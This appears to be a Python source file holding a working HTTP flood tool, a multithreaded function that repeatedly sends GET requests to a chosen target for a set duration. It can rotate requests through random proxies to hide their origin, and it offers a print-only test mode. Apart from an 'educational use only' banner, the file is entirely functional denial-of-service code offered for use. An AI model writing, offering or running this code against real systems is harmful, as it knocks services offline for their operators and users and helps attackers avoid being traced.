import threading
import requests
import time
import random

def http_flood(target, port=None, threads=10, test_mode=False, duration=10, proxies=None):
    print("[!] HTTP Flood - For educational use only!")
    url = f"http://{target}" if not port else f"http://{target}:{port}"
    stop_time = time.time() + duration
    def flood():
        while time.time() < stop_time:
            proxy = None
            if proxies:
                proxy_addr = random.choice(proxies)
                proxy = {
                    'http': f'http://{proxy_addr}',
                    'https': f'http://{proxy_addr}'
                }
            if test_mode:
                print(f"[TEST] Would send HTTP request to {url} via {proxy if proxy else 'no proxy'}")
            else:
                try:
                    requests.get(url, timeout=2, proxies=proxy)
                except Exception:
                    pass
    thread_list = []
    for _ in range(threads):
        t = threading.Thread(target=flood)
        t.start()
        thread_list.append(t)
    for t in thread_list:
        t.join()
    print("[+] HTTP Flood completed.")
